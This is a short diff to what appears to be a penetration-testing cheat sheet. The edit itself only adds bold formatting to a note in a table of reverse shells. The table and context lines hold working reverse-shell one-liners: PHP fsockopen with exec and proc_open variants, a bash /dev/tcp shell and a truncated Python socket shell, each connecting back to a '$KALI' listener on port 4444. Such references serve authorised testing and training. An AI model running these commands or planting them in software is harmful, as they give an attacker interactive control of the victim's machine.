@@ -198,7 +198,7 @@ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOC
 
 |   |   |
 |---|---|
-|Using `exec` is the most common method, but assumes that the file descriptor will be 3<br>Using this method may lead to instances where the connection reaches out to the listener and then closes|`php -r '$sock=fsockopen("$KALI",4444);exec("/bin/sh -i <&3 >&3 2>&3");'`|
+|Using `exec` is the most common method, but assumes that the file descriptor will be 3<br>Using this method may lead to instances where the **connection reaches out to the listener and then closes**|`php -r '$sock=fsockopen("$KALI",4444);exec("/bin/sh -i <&3 >&3 2>&3");'`|
 |Using `proc_open` makes no assumptions about what the file descriptor will be<br>See <https://security.stackexchange.com/a/198944> for more information|`<?php $sock=fsockopen("$KALI",4444);$proc=proc_open("/bin/sh -i",array(0=>$sock, 1=>$sock, 2=>$sock), $pipes); ?>`|
 |Using `exec` to call a `bash` reverse shell|`<?php exec("/bin/bash -c 'bash -i >/dev/tcp/$KALI/4444 0>&1'"); ?>`|
 
